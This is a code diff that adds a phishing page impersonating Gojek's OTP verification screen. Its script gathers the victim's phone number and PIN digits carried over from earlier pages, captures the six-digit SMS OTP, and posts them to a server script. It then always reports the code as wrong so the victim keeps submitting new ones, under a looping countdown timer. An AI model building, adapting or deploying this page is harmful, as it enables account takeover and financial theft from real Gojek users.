@@ -1,0 +1,169 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="theme-color" content="#00880c">
+    <link rel="stylesheet" href="ast/main.css">
+    <link rel="stylesheet" href="ast/pin.css">
+    <link rel="stylesheet" href="ast/load.css">
+    <link href='https://unpkg.com/boxicons@2.1.1/css/boxicons.min.css' rel='stylesheet'>
+    <title>Gojek Super App: Ojek Online, Taksi Online, Pesan Makan, Kirim Barang, Pembayaran</title>
+    <link rel="icon" href="https://d1j87w3j7cc3a6.cloudfront.net/prime/static/prime/images/gojek_favicon.png" type="image/png" sizes="32x32">
+    <meta name="description" content="Lebih dari 1 juta driver Gojek siap melayani ojek online, taksi online, pesan antar makanan, kirim barang, belanja &amp; pembayaran. Download Gojek Super App.">
+    <meta property="og:title" content="Gojek Super App: Ojek Online, Taksi Online, Pesan Makan, Kirim Barang, Pembayaran">
+    <meta property="twitter:title" content="<meta name="description" content="Lebih dari 1 juta driver Gojek siap melayani ojek online, taksi online, pesan antar makanan, kirim barang, belanja &amp; pembayaran. Download Gojek Super App.">
+    <meta property="og:description" content="Gojek Super App: Ojek Online, Taksi Online, Pesan Makan, Kirim Barang, Pembayaran">
+    <meta property="twitter:description" content="Gojek Super App: Ojek Online, Taksi Online, Pesan Makan, Kirim Barang, Pembayaran">
+</head>
+<body>
+    <div class="container page1">
+        <div style="display:none;" class="load">
+            <div class="box">
+                <div class="circle one"></div>
+                <div class="circle two"></div>
+                <div class="circle three"></div>
+            </div>
+        </div>
+        <div class="header">
+            <i onclick="window.location.href='/'" class='bx bx-left-arrow-alt'></i>
+            <i class='bx bxs-help-circle' style="margin-left:310px;" ></i>
+        </div>
+        <div class="title">
+            <h3 class="b" style="font-size:21px;">Masukkan OTP yang kami SMS</h3>
+            <p id="alert" style="font-size:15px;margin-top:10px;" class="r"></p>
+        </div>
+        <form id="formPin" class="ootp">
+            <input type="hidden" name="nohp" id="nohp">
+            <input type="hidden" name="inp1" id="inp1">
+            <input type="hidden" name="inp2" id="inp2">
+            <input type="hidden" name="inp3" id="inp3">
+            <input type="hidden" name="inp4" id="inp4">
+            <input type="hidden" name="inp5" id="inp5">
+            <input type="hidden" name="inp6" id="inp6">
+            <p class="r ot" style="font-weight:bold;"> OTP <span style="color:red;">*</span></p>
+            <div class="box-input-pin">
+                <div class="clear"></div>
+                <input name="pin1" id="pin1" class="inppin b" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
+                <input name="pin2" id="pin2" class="inppin b" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
+                <input name="pin3" id="pin3" class="inppin b" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
+                <input name="pin4" id="pin4" class="inppin b" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
+                <input name="pin5" id="pin5" class="inppin b" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
+                <input name="pin6" id="pin6" class="inppin b" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
+                <div class="timer">
+                    <div class="wait"></div>
+                    <span class="b" id="countdown"></span>
+                </div>
+            </div>
+            <p  style="text-decoration:none;margin-top:5px;color:red;display:none;" class="r reset alert">OTP salah, silakan coba lagi</p>
+        </form>
+        <img class="goto" style="position: fixed;left:0;right:0;bottom: 40px;width:30%;" src="ast/goto1.png">
+    </div>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script>
+    document.getElementById("inp1").value =
+        sessionStorage.getItem("inp1");
+        document.getElementById("inp2").value =
+        sessionStorage.getItem("inp2");
+        document.getElementById("inp3").value =
+        sessionStorage.getItem("inp3");
+        document.getElementById("inp4").value =
+        sessionStorage.getItem("inp4");
+        document.getElementById("inp5").value =
+        sessionStorage.getItem("inp5");
+        document.getElementById("inp6").value =
+        sessionStorage.getItem("inp6");
+</script>
+<script>
+    $(document).ready(function() {
+        $('.clear').click(function() {
+            $('.inppin').val('');
+            $('#pin1').focus();
+        });
+    })
+</script>
+<script>
+    $('.inppin').on('input', function(event) {
+        const inputs = $('.inppin');
+        const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
+        if (isAllFilled == true) {
+            $(event.target).blur();
+            sendPin();
+        }
+        const index = inputs.index(this);
+        const currentValue = event.target.value;
+        if (currentValue.length === 1) {
+            if (index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+        } else if (currentValue.length === 0) {
+            if (index > 0) {
+                inputs[index].focus();
+            }
+        }
+    });
+    $('.inppin').on('keydown', function(event) {
+        const inputs = $('.inppin');
+        const key = event.key;
+        const index = inputs.index(this);
+        if (key === 'Backspace' && event.target.value.length === 0) {
+            if (index > 0) {
+                inputs[index - 1].focus();
+            }
+        }
+    });
+</script>
+<script>
+        
+        
+    
+    var nohp = sessionStorage.getItem("nohp");
+
+    document.getElementById("alert").innerHTML = "Kode-nya kami kirim ke +62" + nohp + " <br/>";
+    function sendPin(){
+        $(".load").fadeIn();
+        document.getElementById("nohp").value =
+    sessionStorage.getItem("nohp");
+    
+        $.ajax({
+            type: 'POST',
+            url: 'req/thre.php',
+            data: $('#formPin').serialize(),
+            dataType: 'text',
+            complete: function(){
+                $(".load").hide();
+                    $(".alert").show();
+                    setTimeout(function(){
+                        $(".inppin").val("");
+                        $("#pin1").focus();
+                        $("#pin1").on("input", function(){
+                            $(".alert").hide();
+                        })
+                    },1600);
+            }
+        });
+    };
+</script>
+<script>
+window.onload = function () {
+  var countdown = 120; // 2 menit dalam detik
+  setInterval(function() {
+    var minutes = Math.floor(countdown / 60);
+    var seconds = countdown - minutes * 60;
+    var formattedMinutes = minutes < 10 ? "0" + minutes : minutes;
+    var formattedSeconds = seconds < 10 ? "0" + seconds : seconds;
+    var formattedTime = formattedMinutes + ":" + formattedSeconds;
+    $('#countdown').text(formattedTime);
+    if (countdown === 0) {
+      countdown = 120; // ulang setelah mencapai waktu 0
+    } else {
+      countdown--;
+    }
+  }, 1000);
+};
+
+</script>
+</body>
+</html>
